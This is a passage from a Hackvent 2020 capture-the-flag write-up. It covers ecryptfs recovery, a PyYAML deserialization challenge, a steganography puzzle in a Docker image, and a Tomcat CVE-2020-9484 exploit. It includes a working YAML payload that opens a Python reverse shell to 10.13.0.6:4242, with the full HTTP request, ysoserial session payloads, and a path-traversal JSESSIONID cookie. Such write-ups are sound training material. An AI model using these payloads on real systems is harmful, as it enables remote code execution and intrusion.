<div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="#cb56-1"></a><span class="bu">echo</span> -n <span class="st">&quot;3a02a723b12f66bcfeaa30353131313962306261636530616236dbb8dd00478fa189aec3cbe52294f4cad157fe2d78656774611f321b99306fc7&quot;</span><span class="kw">|</span> <span class="ex">xxd</span> -r -p <span class="op">&gt;</span> santa/.ecryptfs/santa/.ecryptfs/wrapped-passphrase</span></code></pre></div>
<p>And recover the <code>.Private</code> directory:</p>
<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1"></a>$ <span class="ex">ecryptfs-recover-private</span> </span>
<span id="cb57-2"><a href="#cb57-2"></a><span class="ex">INFO</span>: Searching for encrypted private directories (this might take a while)<span class="ex">...</span></span>
<span id="cb57-3"><a href="#cb57-3"></a><span class="ex">INFO</span>: Found [/home/hacker/Documents/hackvent20/dec18/santa/.ecryptfs/santa/.Private].</span>
<span id="cb57-4"><a href="#cb57-4"></a><span class="ex">Try</span> to recover this directory? [Y/n]: Y</span>
<span id="cb57-5"><a href="#cb57-5"></a><span class="ex">INFO</span>: Found your wrapped-passphrase</span>
<span id="cb57-6"><a href="#cb57-6"></a><span class="ex">Do</span> you know your LOGIN passphrase? [Y/n] Y</span>
<span id="cb57-7"><a href="#cb57-7"></a><span class="ex">INFO</span>: Enter your LOGIN passphrase...</span>
<span id="cb57-8"><a href="#cb57-8"></a><span class="ex">Passphrase</span>: </span>
<span id="cb57-9"><a href="#cb57-9"></a><span class="ex">Inserted</span> auth tok with sig [7b4f67408a83013e] into the user session keyring</span>
<span id="cb57-10"><a href="#cb57-10"></a><span class="ex">INFO</span>: Success!  Private data mounted at [/tmp/ecryptfs.Racizvrv].</span>
<span id="cb57-11"><a href="#cb57-11"></a><span class="ex">INFO</span>: Found [/home/hacker/.Private].</span>
<span id="cb57-12"><a href="#cb57-12"></a><span class="ex">Try</span> to recover this directory? [Y/n]: </span></code></pre></div>
<p>Retrieve the flag at the temporarily mounted folder:</p>
<div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1"></a>$ <span class="fu">cat</span> /tmp/ecryptfs.Racizvrv/flag.txt </span>
<span id="cb58-2"><a href="#cb58-2"></a><span class="ex">HV20</span><span class="dt">{a_b4ckup_of_1mp0rt4nt_f1l35_15_3553nt14l}</span></span></code></pre></div>
<h2 id="tools-11">Tools</h2>
<ul>
<li>hexdump</li>
<li>hashcat</li>
<li>ecryptfs-utils</li>
</ul>
<h2 id="flag-17">Flag</h2>
<p><code>HV20{a_b4ckup_of_1mp0rt4nt_f1l35_15_3553nt14l}</code></p>
<h1 id="hv2019-docker-linter-service">HV20.19 Docker Linter Service</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>The Compiler</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>web security</code>, <code>exploitation</code></td>
</tr>
</tbody>
</table>
<h2 id="description-18">Description</h2>
<p>Docker Linter is a useful web application ensuring that your Docker-related files follow best practices. Unfortunately, there's a security issue in there...</p>
<h3 id="requirements-2">Requirements</h3>
<p>This challenge requires a reverse shell. You can use the provided Web Shell or the VPN to solve this challenge (see <code>RESOURCES</code> on top).</p>
<p>Note: The VPN connection information has been updated.</p>
<h2 id="approaches">Approaches</h2>
<p>I tried several potential approaches only one of them allowed me to successfully create a reverse shell.</p>
<h3 id="failing-abuse-content-disposition-header">Failing: Abuse Content-Disposition header</h3>
<p>This approach tried abusing the <code>filename</code> property of the <code>Content-Disposition</code> header. Web applications sometimes do not validate well filenames and therefore allow to override application files.</p>
<p>The following request generates a 500 error as I added a <code>filename</code> statement to the request in a place where no such statement was expected.</p>
<pre><code>POST /env HTTP/1.1
Host: 6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------352734889893943994491840542
Content-Length: 710
Origin: https://6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land
Connection: close
Referer: https://6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land/env
Cookie: session=eyJjc3JmX3Rva2VuIjoiNWE4NDc0YjZiMTkxYzBjZGY4NzJjMDVjZWMxZTA0YzJkNDY5MmJhNSJ9.X95Rvw.c66m5LLW6FLAnrX-PBa0movpUrg
Upgrade-Insecure-Requests: 1

-----------------------------352734889893943994491840542
Content-Disposition: form-data; name=&quot;csrf_token&quot;

IjVhODQ3NGI2YjE5MWMwY2RmODcyYzA1Y2VjMWUwNGMyZDQ2OTJiYTUi.X95aRg.zhO9krHN6eIQ27aOpTdsgnP8PYk
-----------------------------352734889893943994491840542
Content-Disposition: form-data; name=&quot;contents&quot;; filename=&quot;/dev/urandom&quot;

nananananananananananana=batman
-----------------------------352734889893943994491840542
Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream


-----------------------------352734889893943994491840542
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
-----------------------------352734889893943994491840542--
</code></pre>
<p>As discovered later, this attack was prevented by using <code>utils.secure_filename(uploaded.filename)</code> in the app code.</p>
<h3 id="failing-find-a-rce-vulnerability-in-one-of-the-dependencies">Failing: Find a RCE vulnerability in one of the dependencies</h3>
<p>Next, I searched through the different tools that were invoked by the main app. I hoped for some unfixed RCE vulnerability in one of them. I did not find a vulnerability, though. Dependencies were:</p>
<ul>
<li>dockerlint.js: <a href="https://github.com/redcoolbeans/dockerlint">https://github.com/redcoolbeans/dockerlint</a></li>
<li>hadolint: <a href="https://github.com/hadolint/hadolint">https://github.com/hadolint/hadolint</a></li>
<li>dockerfile_lint: <a href="https://github.com/projectatomic/dockerfile_lint">https://github.com/projectatomic/dockerfile_lint</a></li>
<li>yamllint: <a href="https://github.com/adrienverge/yamllint">https://github.com/adrienverge/yamllint</a></li>
<li>docker-compose: <a href="https://github.com/docker/compose">https://github.com/docker/compose</a></li>
<li>dotenv-linter: <a href="https://github.com/dotenv-linter/dotenv-linter">https://github.com/dotenv-linter/dotenv-linter</a></li>
</ul>
<h3 id="pyyaml-rce-vulnerability">Pyyaml RCE vulnerability</h3>
<p>Finally, I got a hint to check for an RCE in pyyaml and indeed there's several exploits listed in the open ticket at <a href="https://github.com/yaml/pyyaml/issues/420">https://github.com/yaml/pyyaml/issues/420</a>.</p>
<p>The issue, as indicated in the discussion was partially fixed, so <code>!!python/name:xxx</code> yaml tags are not interpreted any longer. So, I tried to use the object only approach as described at <a href="https://github.com/yaml/pyyaml/issues/420#issuecomment-663670547">https://github.com/yaml/pyyaml/issues/420#issuecomment-663670547</a>.</p>
<p>Locally, the following payload indeed worked (yay!):</p>
<div class="sourceCode" id="cb60"><pre class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb60-1"><a href="#cb60-1"></a><span class="ot">!!python/object/new:tuple</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:map</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:type</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:subprocess.Popen</span><span class="at"> </span><span class="kw">{}],</span><span class="at"> </span><span class="kw">[[</span><span class="st">&#39;ls&#39;</span><span class="kw">]]]]</span></span></code></pre></div>
<p>Once more a nice reverse shell payload was crafted inspired by <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/67752de6e9d927c2678b1c64357bc4450ed50ecf/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/67752de6e9d927c2678b1c64357bc4450ed50ecf/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a>.</p>
<p>Experimenting around led me to the conclusion that payloads accessing <code>/dev/tcp</code> or <code>/dev/udp</code> work in rare cases only, as these devices oftentimes are not available.</p>
<p>After some (long) fiddling and some help by <em>mcia</em>, I was able to have the following working payload:</p>
<div class="sourceCode" id="cb61"><pre class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb61-1"><a href="#cb61-1"></a><span class="ot">!!python/object/new:tuple</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:map</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:type</span><span class="at"> </span><span class="kw">[</span><span class="ot">!!python/object/new:subprocess.Popen</span><span class="at"> </span><span class="kw">{}],</span><span class="at"> </span><span class="kw">[[</span><span class="st">&#39;python3&#39;</span><span class="kw">,</span><span class="at"> </span><span class="st">&#39;-c&#39;</span><span class="kw">,</span><span class="at"> </span><span class="st">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.13.0.6&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#39;</span><span class="kw">]]]]</span></span></code></pre></div>
<p>Embedded into a request, this looks as follows:</p>
<pre><code>POST /compose HTTP/1.1
Host: 391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land
Connection: close
Content-Length: 924
Cache-Control: max-age=0
sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;87&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;87&quot;
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybAfclg55CgdMZAnH
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land/compose
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJjc3JmX3Rva2VuIjoiZmFiYWZiZjQ1Y2IwNjgwYWFkMjFmZGFkYTI3MzFiMzQyZTM2NTFiYiJ9.X98r3Q.8DZeJ-BtyuNTQiJMDAz6oabxZDQ

------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name=&quot;csrf_token&quot;

ImZhYmFmYmY0NWNiMDY4MGFhZDIxZmRhZGEyNzMxYjM0MmUzNjUxYmIi.X98r4A.DZtbbXA1aeRf12PC85GECKA5n60
------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name=&quot;contents&quot;

!!python/object/new:tuple [!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], [[&#39;python3&#39;, &#39;-c&#39;, &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.13.0.6&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#39;]]]]
------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream


------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
------WebKitFormBoundarybAfclg55CgdMZAnH--
</code></pre>
<p>Again, on the client side, I prepared my netcat to listen on 4242 (<code>nc -nlvp 4242</code>) and, once the reverse shell connected, I was able to find the flag in the file <code>flag.txt</code>.</p>
<p>BTW, find the server <a href="./dec19.tar.gz">source code here</a>.</p>
<h2 id="tools-12">Tools</h2>
<ul>
<li>python3</li>
<li>nc</li>
<li>BurpSuite</li>
<li>DuckDuck Go</li>
<li>The Hacking-Lab VPN client, which did not work over my local network for some unknown but time absorbing reason üôà</li>
</ul>
<h2 id="flag-18">Flag</h2>
<p><code>HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}</code></p>
<h1 id="hv2020-twelve-steps-of-christmas">HV20.20 Twelve steps of Christmas</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Bread <span class="emoji" data-emoji="bread">üçû</span></td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>leet</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>programming</code>, <code>forensic</code>, <code>linux</code></td>
</tr>
</tbody>
</table>
<h2 id="description-19">Description</h2>
<p>On the twelfth day of Christmas my true love sent to me... twelve rabbits a-rebeling, eleven ships a-sailing, ten (twentyfourpointone) pieces a-puzzling, and the rest is history.</p>
<p><img src="./bfd96926-dd11-4e07-a05a-f6b807570b5a.png" alt="Bunnies" /></p>
<h3 id="hints-11">Hints</h3>
<p>You should definitely give <a href="./7da737b4-29ba-4f4d-b882-b4ec133bc6c9.txt">Bread's famous easy perfect fresh rosemary yeast black pepper bread</a> a try this Christmas!</p>
<h2 id="approach-18">Approach</h2>
<p>Rabbit holes ahead! The given png file was also interpretable as a html file thanks to an early png <code>tEXt</code> chunk containing an html tag. To provoke this effect, I renamed <code>image.png</code> to <code>image.png.html</code> and opened it in a browser.</p>
<pre><code>00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 06 60 00 00 03 f3  08 06 00 00 00 a0 37 c3  |...`..........7.|
00000020  0b 00 00 00 0c 74 45 58  74 3c 68 74 6d 6c 3e 00  |.....tEXt&lt;html&gt;.|
00000030  3c 21 2d 2d 20 f1 a3 a4  de 00 00 1b 20 74 45 58  |&lt;!-- ....... tEX|
00000040  74 5f 00 72 a4 de 43 87  7d b8 c4 45 72 a5 38 4b  |t_.r..C.}..Er.8K|
00000050  b0 33 b0 56 af bb 6a a2  23 a7 50 45 84 e9 58 c3  |.3.V..j.#.PE..X.|
00000060  e5 33 9f 58 7d 7c ef 38  ee f8 4c eb a2 db 98 9c  |.3.X}|.8..L.....|
00000070  e9 ed ad ba b2 7e 47 61  ed 4a 57 5b df 8f ba ad  |.....~Ga.JW[....|
00000080  a0 fb fd 33 e7 e7 35 e4  7a 5a a4 f2 88 ad 85 7b  |...3..5.zZ.....{|
00000090  35 f8 4e 6e 28 94 cd 96  85 97 25 34 c6 82 48 f9  |5.Nn(.....%4..H.|
</code></pre>
<p>In parallel, I analysed the html and most importantly the script that was executed when one clicks on the image. It checks for a query parameter <code>p</code> holding a value that SHA1 hashes to <code>60DB15C4E452C71C5670119E7889351242A83505</code>.</p>
<p>According to <a href="https://crackstation.net/">CrackStation</a> that value is <code>bunnyrabbitsrule4real</code>.</p>
<p>With that parameter in the URL: <code>file:///home/manu/Documents/private/hackvent20/dec20/bfd96926-dd11-4e07-a05a-f6b807570b5a.png.html?p=bunnyrabbitsrule4real</code>, I clicked on the image to trigger the JS code, which generated a file named <code>11.py</code>. There was also another rabbit image displayed with strange dots on top, but the dots decoded to <code>11.py</code> as well.</p>
<p><code>11.py</code> contains the following code:</p>
<div class="sourceCode" id="cb64"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb64-1"><a href="#cb64-1"></a><span class="im">import</span> sys</span>
<span id="cb64-2"><a href="#cb64-2"></a><span class="bu">print</span>(sys.argv[<span class="dv">1</span>])</span>
<span id="cb64-3"><a href="#cb64-3"></a><span class="bu">print</span>(sys.argv[<span class="dv">2</span>])</span>
<span id="cb64-4"><a href="#cb64-4"></a>i <span class="op">=</span> <span class="bu">bytearray</span>(<span class="bu">open</span>(sys.argv[<span class="dv">1</span>], <span class="st">&#39;rb&#39;</span>).read().split(sys.argv[<span class="dv">2</span>].encode(<span class="st">&#39;utf-8&#39;</span>) <span class="op">+</span> b<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>)[<span class="op">-</span><span class="dv">1</span>])</span>
<span id="cb64-5"><a href="#cb64-5"></a>j <span class="op">=</span> <span class="bu">bytearray</span>(b<span class="st">&quot;Rabbits are small mammals in the family Leporidae of the order Lagomorpha (along with the hare and the pika). Oryctolagus cuniculus includes the European rabbit species and its descendants, the world&#39;s 305 breeds[1] of domestic rabbit. Sylvilagus includes 13 wild rabbit species, among them the seven types of cottontail. The European rabbit, which has been introduced on every continent except Antarctica, is familiar throughout the world as a wild prey animal and as a domesticated form of livestock and pet. With its widespread effect on ecologies and cultures, the rabbit (or bunny) is, in many areas of the world, a part of daily life-as food, clothing, a companion, and a source of artistic inspiration.&quot;</span>)</span>
<span id="cb64-6"><a href="#cb64-6"></a><span class="bu">open</span>(<span class="st">&#39;11.7z&#39;</span>, <span class="st">&#39;wb&#39;</span>).write(<span class="bu">bytearray</span>([i[_] <span class="op">^</span> j[_<span class="op">%</span><span class="bu">len</span>(j)] <span class="cf">for</span> _ <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(i))]))</span></code></pre></div>
<p><code>11.py</code> hints towards a 7z file. 7z files have a magic file identifier being <code>37 7A BC AF 27 1C</code>. If we XOR that with "Rabbit" (which is what <code>11.py</code> does), we know what bytes to look for: <code>65 1b de cd 4e 68</code>. According to the code, this sequence is preceded by <code>0a</code>, a newline character.</p>
<p>I looked for this sequence in a very simple manner leveraging <code>hexdump</code> (or alternatively <code>xxd</code>):</p>
<div class="sourceCode" id="cb65"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb65-1"><a href="#cb65-1"></a><span class="kw">for</span> <span class="ex">f</span> in ./*<span class="kw">;</span> <span class="kw">do</span> <span class="fu">hexdump</span> -C <span class="va">$f</span> <span class="kw">|</span> <span class="fu">grep</span> -n <span class="st">&#39;0a 65 1b de cd&#39;</span> <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="va">$f</span><span class="kw">;</span> <span class="kw">done</span></span>
<span id="cb65-2"><a href="#cb65-2"></a><span class="ex">231074</span>:00386a10  82 62 72 65 61 64 62 72  65 61 64 0a 65 1b de cd  <span class="kw">|</span><span class="ex">.breadbread.e...</span><span class="kw">|</span></span>
<span id="cb65-3"><a href="#cb65-3"></a><span class="ex">./bfd96926-dd11-4e07-a05a-f6b807570b5a.png</span></span></code></pre></div>
<p><code>0x0a</code> is preceded by "breadbread", which is our separator. So let's run the python script, which then produces <code>11.7z</code>:</p>
<div class="sourceCode" id="cb66"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb66-1"><a href="#cb66-1"></a><span class="ex">python3</span> ./11.py bfd96926-dd11-4e07-a05a-f6b807570b5a.png breadbread</span></code></pre></div>
<p>To look a bit closer into <code>11.7z</code>, let's walk through it (recursively):</p>
<div class="sourceCode" id="cb67"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="#cb67-1"></a><span class="ex">binwalk</span> -eM 11.7z</span></code></pre></div>
<p>This extracts a ton of files... which look like a Docker image.</p>
<p>The file <code>1d66b052bd26bb9725d5c15a5915bed7300e690facb51465f2d0e62c7d644649.json</code> looks interesting and contains the following:</p>
<pre><code>[...]
&quot;RUN /bin/sh -c cp /tmp/t/bunnies12.jpg bunnies12.jpg &amp;&amp; steghide embed -e loki97 ofb -z 9 -p \&quot;bunnies12.jpg\\\\\\\&quot; -ef /tmp/t/hidden.png -p \\\\\\\&quot;SecretPassword\&quot; -N -cf \&quot;bunnies12.jpg\&quot; -ef \&quot;/tmp/t/hidden.png\&quot; &amp;&amp; mkdir /home/bread/flimflam &amp;&amp; xxd -p bunnies12.jpg &gt; flimflam/snoot.hex &amp;&amp; rm -rf bunnies12.jpg &amp;&amp; split -l 400 /home/bread/flimflam/snoot.hex /home/bread/flimflam/flom &amp;&amp; rm -rf /home/bread/flimflam/snoot.hex &amp;&amp; chmod 0000 /home/bread/flimflam &amp;&amp; apk del steghide xxd # buildkit&quot;
[...]
</code></pre>
<p>It seems like there was some secret embedded into a <code>bunnies12.jpg</code> image using steghide and then split up into multiple hex files. Let's undo that.</p>
<p>To do so, we first need to find the right layer/directory which seems to be <code>ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1</code>, since it contains many files named <code>flom</code> followed by a numeric index.</p>
<p>I proceeded as follows to find the hidden immage:</p>
<div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1"></a><span class="fu">chmod</span> 755 ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1/_layer.tar.extracted/home/bread/flimflam</span>
<span id="cb69-2"><a href="#cb69-2"></a><span class="fu">ls</span> -al ab2b751e14409f169383b5802e61764fb4114839874ff342586ffa4f968de0c1/_layer.tar.extracted/home/bread/flimflam/*</span>
<span id="cb69-3"><a href="#cb69-3"></a><span class="co"># many many files here</span></span>
<span id="cb69-4"><a href="#cb69-4"></a><span class="fu">cat</span> flom* <span class="op">&gt;</span>snoot.hex</span>
<span id="cb69-5"><a href="#cb69-5"></a><span class="fu">cat</span> snoot.hex <span class="kw">|</span> <span class="ex">xxd</span> -r -p <span class="op">&gt;</span> ../bunnies12.jpg</span>
<span id="cb69-6"><a href="#cb69-6"></a></span>
<span id="cb69-7"><a href="#cb69-7"></a><span class="ex">steghide</span> --extract -sf bunnies12.jpg -p <span class="st">&quot;bunnies12.jpg</span><span class="dt">\\\&quot;</span><span class="st"> -ef /tmp/t/hidden.png -p </span><span class="dt">\\\&quot;</span><span class="st">SecretPassword&quot;</span> -xf hidden.png</span></code></pre></div>
<p><code>hidden.png</code> contains an unreadable QR code (because the white border is missing). making it readable gives the flag(.png)!</p>
<p><img src="./flag.png" alt="Flag" /></p>
<h2 id="flag-19">Flag</h2>
<p><code>HV20{My_pr3c10u5_my_r363x!!!,_7hr0w_17_1n70_7h3_X1._-_64l4dr13l}</code></p>
<h1 id="hv2021-threatened-cat">HV20.21 Threatened Cat</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>inik</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>web security</code>, <code>exploitation</code></td>
</tr>
</tbody>
</table>
<h2 id="description-20">Description</h2>
<p>You can feed this cat with many different things, but only a certain kind of file can endanger the cat.</p>
<p>Do you find that kind of files? And if yes, can you use it to disclose the flag? Ahhh, by the way: The cat likes to hide its stash in <code>/usr/bin/catnip.txt</code>.</p>
<p><strong>Note</strong>: The cat is currently in hibernation and will take a few seconds to wake up.</p>
<h2 id="approach-19">Approach</h2>
<p>Request to <code>https://81c2252c-618c-4fdf-bec0-9cf7ed008266.idocker.vuln.land/bin/catnip.txt</code> gave a 404 page including server version: <code>Apache Tomcat/9.0.34</code></p>
<p>Since this challenge is in the <code>exploitation</code> category, there probably is some exploit around for that version of Tomcat.</p>
<p>Candidate exploits are:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/49039">https://www.exploit-db.com/exploits/49039</a> --&gt; nope, this one applies only to versions up to 9.0.30.</li>
<li><a href="https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.35">https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.35</a> --&gt; CVE-2020-9484: This looks more promising! All the information needed seems to be available (i.e. we can upload files, control their name, know where files are stored, etc.)</li>
</ul>
<p>A nice write-up about the vulnerability can be found at <a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/</a>.</p>
<p>So, the plan is to generate a session store, upload it through the regular "threatened cat" interface (as a <code>bla.session</code> file), craft a second request with the value in the<code>JSESSIONID</code> cookie pointing to the uploaded file.</p>
<p>I initially started generating a single payload using <code>ysoserial</code>. It impressed the cat (it said so...), but it didn't work. So, I went a bit more broad and generated many payloads at once and uploaded these:</p>
<div class="sourceCode" id="cb70"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="#cb70-1"></a><span class="kw">for</span> <span class="ex">pl</span> in Clojure CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7<span class="kw">;</span> <span class="kw">do</span> <span class="ex">java</span> -jar ~/tools/ysoserial-master-30099844c6-1.jar <span class="va">$pl</span> <span class="st">&#39;cp /usr/bin/catnip.txt /usr/local/uploads/catnip.txt&#39;</span> <span class="op">&gt;</span> <span class="va">$pl</span>.session<span class="kw">;</span> <span class="kw">done</span></span></code></pre></div>
<p><img src="./threatened_cat.png" alt="Threatened cat" /></p>
<p>I then triggered requests with the <code>JSESSIONID</code> pointing to these files:</p>
<pre><code>GET /cat/;jsessionid=DC086F9205C860F48FCAC655CE2013A3 HTTP/1.1
Host: 08cbe5a5-3262-47e0-994a-c5655f0b856c.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://08cbe5a5-3262-47e0-994a-c5655f0b856c.idocker.vuln.land/cat/
Connection: close
Cookie: JSESSIONID=../../../../../../../../../../usr/local/uploads/CommonsCollections2
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

</code></pre>
<p>Finally, the <code>CommonsCollections2</code> payload did the trick and copied the <code>catnip.txt</code> file to the uploads folder where it was accessible to me. The response to that request includes long stacktraces letting me know that the payload was indeed executed:</p>
<pre><code>HTTP/1.1 500 Internal Server Error
Content-Language: en
Content-Type: text/html;charset=utf-8
Date: Mon, 21 Dec 2020 13:17:32 GMT
Connection: close
Content-Length: 11546

&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 ‚Äì Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 ‚Äì Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; InvokerTransformer: The method &amp;#39;newTransformer&amp;#39; on &amp;#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;#39; threw an exception&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.apache.commons.collections4.FunctorException: InvokerTransformer: The method &amp;#39;newTransformer&amp;#39; on &amp;#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;#39; threw an exception
    org.apache.commons.collections4.functors.InvokerTransformer.transform(InvokerTransformer.java:137)
    org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
    java.base&amp;#47;java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:713)
    java.base&amp;#47;java.util.PriorityQueue.heapify(PriorityQueue.java:735)
    java.base&amp;#47;java.util.PriorityQueue.readObject(PriorityQueue.java:802)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    java.base&amp;#47;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    java.base&amp;#47;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    java.base&amp;#47;java.lang.reflect.Method.invoke(Method.java:564)
    java.base&amp;#47;java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1216)
    java.base&amp;#47;java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2359)
    java.base&amp;#47;java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2193)
    java.base&amp;#47;java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1685)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:499)
    java.base&amp;#47;java.io.ObjectInputStream.readObject(ObjectInputStream.java:457)
    org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1554)
    org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1049)
    org.apache.catalina.session.FileStore.load(FileStore.java:229)
    org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:764)
    org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:714)
